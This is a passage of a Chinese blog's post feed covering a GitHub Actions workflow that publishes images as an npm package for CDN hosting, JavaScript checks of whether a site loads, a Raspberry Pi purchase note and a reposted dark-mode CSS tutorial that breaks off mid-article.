class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 11:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 04:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 